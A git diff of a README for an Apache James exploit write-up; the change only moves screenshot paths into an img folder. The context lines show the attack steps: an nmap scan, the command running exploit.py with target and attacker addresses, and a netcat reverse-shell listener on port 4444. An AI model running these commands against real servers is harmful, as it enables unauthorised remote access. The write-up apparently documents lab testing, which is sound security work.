@@ -82,7 +82,7 @@ This exploit was tested in a **private lab setup** using a clean vulnerable inst
 
 An `nmap` scan reveals that the target server is running all James services.
 
-![Apache Version](./apache_JAMES.png)
+![Apache Version](./img/apache_JAMES.png)
 
 ---
 
@@ -94,14 +94,14 @@ Command to execute the exploit:
 python exploit.py <target-ip> <your-ip> <your-port>
 ```
 
-![Exploit](./Exploit.png)
+![Exploit](./img/Exploit.png)
 
 ### 3. Reverse Shell Listener
 Start a netcat listener on the attacker's machine:
 ```bash
 nc -nvlp 4444
 ```
-![Reverse Shell](./ReverseShell.png)
+![Reverse Shell](./img/ReverseShell.png)
 
 ## Medium Blog
 I’ve written a more in-depth explanation and walkthrough of this exploit on Medium:
